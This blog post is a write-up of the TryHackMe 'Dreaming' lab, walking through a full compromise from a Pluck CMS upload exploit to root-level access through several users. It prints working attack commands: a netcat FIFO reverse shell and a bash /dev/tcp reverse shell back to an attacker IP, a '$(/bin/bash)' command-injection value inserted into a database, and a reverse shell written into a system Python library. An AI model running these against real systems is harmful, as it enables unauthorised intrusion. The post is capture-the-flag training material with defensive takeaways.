---
layout: ../../layouts/BlogLayout.astro
title: "Dreaming THM write-up"
date: "JUN 15, 2026"
readTime: "15 MIN READ"
author: "Harsha"
category: "cyber"
---

## Introduction

**Dreaming** is a fantastic, beginner-friendly room on TryHackMe that tests your web enumeration skills, database manipulation knowledge, and ability to exploit misconfigured Python libraries for privilege escalation.

Here is the complete step-by-step breakdown of how I compromised this machine, escalating from `www-data` to `lucien`, `death`, and finally `morpheus`.

## Phase 1: Initial Foothold (`www-data`)

### 1. Web Enumeration

Starting with directory brute-forcing using **Gobuster**, I discovered an interesting subdirectory: `/app`. Navigating there revealed that the server was running **Pluck CMS version 4.7.13**.

Using `searchsploit`, I looked up known vulnerabilities for this version:

Bash

```
searchsploit pluck 4.7.13
```

I found an exploit matching **Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)**.

### 2. Bypassing Authentication & RCE

Because this exploit requires administrative privileges, I attempted to log into the admin panel using weak/common credentials. Standard combinations did the trick:

- **Username/Password:** `admin`

Once authenticated, I utilized the file upload functionality to execute a Python script to get a basic Powny Shell. To stabilize and make my interaction easier, I executed a traditional Netcat one-liner to spawn a reverse shell back to my attacking machine:

Bash

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.135.178 4444 >/tmp/f
```

I successfully caught the shell as `www-data`.

## Phase 2: Horizontal Privilege Escalation (`lucien`)

### 1. Manual Reconnaissance

As `www-data`, I began looking for sensitive files readable by any user. During my hunt in the `/opt` directory, I hit a breakthrough. Inside a file called `/opt/test.py`, I found **Lucien's password** stored in plaintext.

### 2. Upgrading to SSH

Armed with the password, I SSH'ed into the target machine to get a stable, fully interactive shell as `lucien`:

Bash

```
ssh lucien@<Target-IP>
```

- **FLAG 1 Captured!**

## Phase 3: Lateral Movement to `death`

### 1. Checking Sudo Privileges

The first rule of Linux post-exploitation is running `sudo -l`. Lucien's privileges showed the following:

Plaintext

```
User lucien may run the following commands on ip-10-49-142-158:
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

Running the script manually just outputs some dream entries:

Plaintext

```
Alice + Flying in the sky
Bob + Exploring ancient ruins
...
```

### 2. Database Exploitation

To understand where this script gets its data, I checked `lucien`'s `.bash_history` file. Inside, I found hardcoded **MySQL credentials** for the `lucien` user.

I logged into the database:

Bash

```
mysql -u lucien -p
```

Inside the `library` database, there was a table named `dreams`. Recognizing that `getDreams.py` pulls text directly from this table and likely executes it unsafely in a system subshell, I decided to perform a command injection attack by inserting a bash spawn string into the table:

SQL

```
INSERT INTO dreams (column_name) VALUES ("$(/bin/bash)");
```

Once the payload was safely in the database, I triggered the sudo command as the user `death`:

Bash

```
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

The script read my SQL payload, executed the command injection, and dropped me into a shell as `death`.

- **FLAG 2 Captured!**
    

## Phase 4: Vertical Privilege Escalation (`morpheus`)

### 1. Python Library Hijacking

Navigating into `/home/morpheus`, I found a backup script named `restore.py`:

Python

```
from shutil import copy2 as backup
src_file = "/home/morpheus/kingdom"
dst_file = "/kingdom_backup/kingdom"
backup(src_file, dst_file)
print("The kingdom backup has been done!")
```

The script imports the `shutil` library. I checked the permissions of the system's global Python library directory to see if `shutil.py` was secure:

Bash

```
death@ip-10-49-142-158:/lib/python3.8$ ls -la | grep "shutil.py"
-rw-rw-r--  1 root death  51474 Mar 18  2025 shutil.py
```

Because the `shutil.py` file belonged to the `death` group and was **writable**, I could hijack it!

### 2. Catching Root/Morpheus

I appended a Python reverse shell directly into the global `shutil.py` file:

Bash

```
echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/192.168.135.178/1234 0>&1'\")" > /usr/lib/python3.8/shutil.py
```

Knowing that `restore.py` was being run automatically in the background via a system cron job, I opened a listener on my attack machine on port `1234`:

Bash

```
nc -lnvp 1234
```

After a brief wait, the cron job executed `restore.py`, which imported my malicious `shutil.py` file. The reverse shell connected back instantly, yielding a root/morpheus level shell.

- **FLAG 3 Captured! Room Complete!**
    

## Conclusion & Key Takeaways

1. **Sanitize Inputs:** The database command injection emphasizes why apps must never use user-controlled inputs (or database strings) directly in system shell executions.
    
2. **Secure the Standard Library:** Python libraries should never be writable by non-root users. Group write permissions on folders like `/usr/lib/python3.x/` can lead to immediate system compromise via library hijacking.
